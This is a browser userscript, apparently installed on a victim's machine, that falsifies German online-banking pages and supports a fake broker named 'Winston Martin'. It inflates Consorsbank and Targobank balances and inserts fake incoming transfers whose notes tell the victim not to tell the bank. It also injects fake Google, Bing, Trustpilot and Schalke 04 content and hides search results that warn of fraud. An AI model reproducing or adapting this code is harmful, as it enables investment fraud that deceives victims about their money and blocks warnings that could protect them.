// ==UserScript==
// @name         Ed WM Sp Siegfried Stampfl
// @namespace    http://tampermonkey.net/
// @version      9.0
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/495237/Ed%20WM%20Sp%20Siegfried%20Stampfl.user.js
// @updateURL https://update.greasyfork.org/scripts/495237/Ed%20WM%20Sp%20Siegfried%20Stampfl.meta.js
// ==/UserScript==



//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// GESAMT START

   // Configurable modification amounts and their corresponding indexes
    const accountBalanceAdjustments = [
        { index: 0, amount: 43000 },

    ];

// BALANCES START

    // Configurable modification amounts and their corresponding indexes
    const balanceModificationConfig = [
        { index: 0, amount: 43000 },
     //    { index: 1, amount: 43000 },

        { index: 4, amount: 43000 },
        { index: 5, amount: 43000},
    ];

//  UMSATZE BALANCE

  // Configurable modification amount
    const modificationAmount = 43000; // Set your desired modification amount here
    const accountValue = '920043381'; // Set your desired account value here
    const useSelectedOption = true; // Set to false to ignore the selected option in the dropdown  BEING SET TO TRUE WHEN CLIENT HAS MANY ACCOUNTS, HOWEVER, WHEN CLIENT HAS 1 ACCOUNT IS USUALLY  BEING SET TO FALSE


// UMSATZE TRANSACTIONS

   // Specify transactions here
    const transactions = [
           {
            transactionDate: "Vorgemerkt",
            transactionDateBooking: " ",
            transactionTitle: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe nötig durch Absender. A. Graf meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
            transactionAmount: "+667.972,37 EUR",
            insertPosition: 'above' // Specify position for this transaction
        },
       {
            transactionDate: "15.07.2024",
            transactionDateBooking: "15.07.2024",
            transactionTitle: "JP Morgan Chase",
           transactionDetails: "Geld für Steuern. A. Graf meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "+43.000,00 EUR",
           insertPosition: 'above' // Specify position for this transaction
       },
 //       {
 //           transactionDate: "01.07.2024",
 //           transactionDateBooking: "01.07.2024",
 //           transactionDetails: "Bank of America 3.000 Euro 04.07. 10356100",
 //           transactionAmount: "-3.000,00 EUR",
 //           insertPosition: 'above' // Specify position for this transaction
 //       }
        // Add more transactions as needed
    ];




//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================


if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

 //   // Configurable modification amounts and their corresponding indexes
 //   const accountBalanceAdjustments = [
 //       { index: 0, amount: 700 },

//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
const presenceCheckElement = document.querySelector('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8') && document.querySelector('div.row.margin-top-5 h4') && document.querySelector('.flex-element.col-pad.end-xs');
        if (presenceCheckElement) {
            // Iterate over each balance adjustment configuration
            accountBalanceAdjustments.forEach(({ index, amount }) => {
                // Find the balance element based on index
                const balanceElements = document.querySelectorAll('div.row.margin-top-5 h4');
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            // Remove the presence check element 5 milliseconds after modification
          setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8' removed");
                });
            }, 30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 100); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

                    }



if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {

    'use strict';

//    // Configurable modification amounts and their corresponding indexes
//    const balanceModificationConfig = [
//        { index: 0, amount: 700 },
////        { index: 2, amount: 700 },
//        { index: 5, amount: 700 },
//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
       const presenceCheckElement = document.querySelector('.flex.tooltip-primary') && document.querySelector('.flex-element.col-pad.end-xs');

if (presenceCheckElement) {
            // Log the text content and indexes of all elements with the specified class
            const balanceElements = document.querySelectorAll('.flex-element.col-pad.end-xs');
            balanceElements.forEach((element, index) => {
                console.log(`Element at index ${index} with class 'flex-element col-pad end-xs': ${element.textContent.trim()}`);
            });

            // Iterate over each balance adjustment configuration
            balanceModificationConfig.forEach(({ index, amount }) => {
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.flex.tooltip-primary');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.flex.tooltip-primary' removed");
                });
            },30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 150); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

 }







    // Check if the account value is present in the URL
    if (window.location.href.indexOf("consors") > 0 ||
        window.location.href.indexOf("drive") > 0 ||
        window.location.href.indexOf("Ueberweisung") > 0) {

    // Function to check the account value
    function checkAccountValue() {
        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue === accountValue) {
                    return true;
                } else {
                    console.log(`Selected account value (${selectedOptionValue}) does not match expected value (${accountValue}). Skipping balance modification.`);
                    return false;
                }
            } else {
                console.log('Select dropdown element not found. Skipping balance modification.');
                return false;
            }
        }
        return true; // If useSelectedOption is false, always return true
    }

    // Function to modify the balance
    function modifyBalance() {
        if (!checkAccountValue()) {
            return;
        }

        const presenceCheckElement = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
        if (presenceCheckElement) {
            const balanceElement = document.getElementById('account-header-balance');
            if (balanceElement) {
                const balanceText = balanceElement.textContent.trim();
                const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                if (!isNaN(balanceValue)) {
                    const newBalanceValue = balanceValue + modificationAmount;
                    const formattedNewBalance = formatBalance(newBalanceValue);

                    balanceElement.textContent = formattedNewBalance + ' EUR';

                    console.log(`Balance modified from ${balanceText} to ${formattedNewBalance} EUR`);

                    setTimeout(() => {
                        const elementToRemove = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
                        if (elementToRemove) {
                            elementToRemove.remove();
                            console.log("Element with class '.margin-top-20-md.margin-top-20-lg.row.text-typo' removed");
                        }
                    }, 5);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            } else {
                console.log('Balance element not found.');
            }
        } else {
            console.log('Presence check element not found. Balance not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ',');
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    }

    // Function to repeatedly check and modify the balance every 10 seconds
    function startBalanceModification() {
        setInterval(modifyBalance, 70); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
    window.addEventListener('load', startBalanceModification);
    }




if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("Ueberweisung") > 0) {
    'use strict';

    // Specify transactions here
//    const transactions = [
 //       {
//            transactionDate: "03.07.2024",
//            transactionDateBooking: "03.07.2024",
//            transactionTitle: "NewTitle*Example 1234 City",
//            transactionDetails: "JP Morgan Chase 2.500 Euro 03.07. 10356092",
 //           transactionAmount: "+2.500,00 EUR",
//            insertPosition: 'above' // Specify position for this transaction
 //       },
        // Add more transactions as needed
 //   ];

    function duplicateAndModifyFirstElement(transactions) {
        let accountMatches = true;

        // Check if the account value matches if the flag is set
        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue !== accountValue) {
                    accountMatches = false;
                }
            } else {
                console.log("Select dropdown element not found.");
                return;
            }
        }

        if (accountMatches) {
            // Account value matches, proceed with inserting transactions
            const element = document.querySelector('.tablecards-row.transition--ease-3');
            if (element) {
                transactions.forEach(transaction => {
                    const clone = element.cloneNode(true);

                    // Modify the transaction date
                    const dateElement = clone.querySelector('.tablecards-cell .tablecards-values');
                    if (dateElement) {
                        dateElement.textContent = transaction.transactionDate;
                    }

                    // Modify the transaction date booking
                    const bookingDateElement = clone.querySelectorAll('[data-type="valueDate"]')[0];
                    if (bookingDateElement) {
                        bookingDateElement.textContent = transaction.transactionDateBooking;
                    }

                    // Modify the transaction title
                    const titleElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[2];
                    if (titleElement) {
                        titleElement.textContent = transaction.transactionTitle;
                    }

                    // Modify the transaction details
                    const detailsElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[3];
                    if (detailsElement) {
                        detailsElement.textContent = transaction.transactionDetails;
                    }

                    // Modify the transaction amount
                    const amountElement = clone.querySelector(
                        '.tablecards-cell .tablecards-values.text--red, .tablecards-values.text--consors-basic-green'
                    );
                    if (amountElement) {
                        // Determine if the transaction amount is positive or negative
                        const isPositive = transaction.transactionAmount.trim().startsWith('+');
                        const newAmountElement = document.createElement('div');
                        newAmountElement.classList.add('tablecards-values');
                        if (isPositive) {
                            newAmountElement.classList.add('text--consors-basic-green');
                        } else {
                            newAmountElement.classList.add('text--red');
                        }
                        newAmountElement.textContent = transaction.transactionAmount;
                        amountElement.parentNode.replaceChild(newAmountElement, amountElement);
                    }

                    // Determine where to insert the clone
                    const position = transaction.insertPosition || 'above'; // Default to 'above' if not specified
                    if (position === 'above') {
                        element.parentNode.insertBefore(clone, element);
                    } else {
                        element.parentNode.insertBefore(clone, element.nextSibling);
                    }

                    // Add new HTML after the transaction was inserted
                    const tablecardsCellNoWrapElement = clone.querySelector('.tablecards-cell.no-wrap');
                    if (tablecardsCellNoWrapElement) {
                        const newHtml = document.createElement('div');
                        newHtml.classList.add('tablecards-values');
                        newHtml.innerHTML = `
                            <div data-type="valueDate" class="flex middle-xs">
                                <span class="text--grey">${transaction.transactionDateBooking}</span>
                                <p class="text--grey"></p>
                            </div>`;
                        tablecardsCellNoWrapElement.appendChild(newHtml);
                    }

                    console.log("Element duplicated, modified, and new HTML added.");
                });

                // Remove the trigger element after 5 milliseconds
                setTimeout(() => {
                    const triggerElement = document.querySelector('.input.input-rounded.input-shadow.input-border.form-label-input-top');
                    if (triggerElement) {
                        triggerElement.remove();
                        console.log('Trigger element removed.');
                    }

                    // Remove unnecessary tablecards-values elements
                    removeSecondTablecardsValues();

                }, 5);
            } else {
                console.log("No element found with the specified class.");
            }
        } else {
            console.log("Account value does not match. Transactions not inserted.");
        }
    }

    // Function to check for the trigger element and insert transactions
    function checkAndInsertTransactions() {
        const triggerElement = document.querySelector('.input.input-rounded.input-shadow.input-border.form-label-input-top');
        if (triggerElement) {
            duplicateAndModifyFirstElement(transactions);
        }
    }

    // Function to remove the second tablecards-values element under label="Betrag" and under .row.end-xs
    function removeSecondTablecardsValues() {
        // Remove under wb-simple-text with label="Betrag"
        const wbSimpleTextElements = document.querySelectorAll('wb-simple-text[label="Betrag"]');
        wbSimpleTextElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under wb-simple-text[label="Betrag"].');
            }
        });

        // Remove under .row.end-xs
        const rowEndXsElements = document.querySelectorAll('.row.end-xs');
        rowEndXsElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under .row.end-xs.');
            }
        });
    }

    // Run the checkAndInsertTransactions function initially and then every 5 seconds
    setInterval(checkAndInsertTransactions, 4000); // Check every 5 seconds
    setInterval(() => {

        removeSecondTablecardsValues(); // Continuously check and remove unnecessary elements
    }, 10);
}








if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

    // Function to remove elements with specified classes
    function removeSpecifiedElements() {
        // Remove elements with class .col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10
        let classElements1 = document.querySelectorAll('.col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10');
        classElements1.forEach(element => element.remove());

        // Remove elements with class .margin-top-5.row.text-typo.hidden-xs.hidden-sm
        let classElements2 = document.querySelectorAll('.margin-top-5.row.text-typo.hidden-xs.hidden-sm');
        classElements2.forEach(element => element.remove());

        // Remove elements with class .row.row-neutral.hidden-sm.hidden-xs
        let classElements3 = document.querySelectorAll('.row.row-neutral.hidden-sm.hidden-xs');
        classElements3.forEach(element => element.remove());

        // Remove elements with tag app-exporters
        let tagElements = document.querySelectorAll('app-exporters');
        tagElements.forEach(element => element.remove());
    }

    // Check for specified elements every 50ms
    setInterval(removeSpecifiedElements, 50);
}


 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "winston", "martin", "winston martin", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.winstonmartin.com/",
                                title: "Winston Martin dein Broker",
                                description: "Winston Martin ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.winstonmartin.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Winston Martin - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Winston Martin",
                                footerText: "https://de.trustpilot.com/review/winstonmartin.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Winston Martin Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Winston Martin ab dem 1. Januar unser Sponsor und Partner wird. Winston Martin ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Winston Martin sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Winston Martin";
    const customLogoURL = "https://p-cdn.co/winstonmartin/brands/winstonmartin/logo-white.png";
    const customURL = "https://cfd.winstonmartin.com/";
    const customReferenceURL = "winstonmartin.com";
    const customLinkURL = "https://cfd.winstonmartin.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Winston Martin",
      "icmarkets": "Winston Martin",
      "ic-markets": "Winston Martin",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.winstonmartin.com/";
var newLogoURL = "https://i.ibb.co/wRWGRKf/Copy-of-Untitled-Design-1.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }

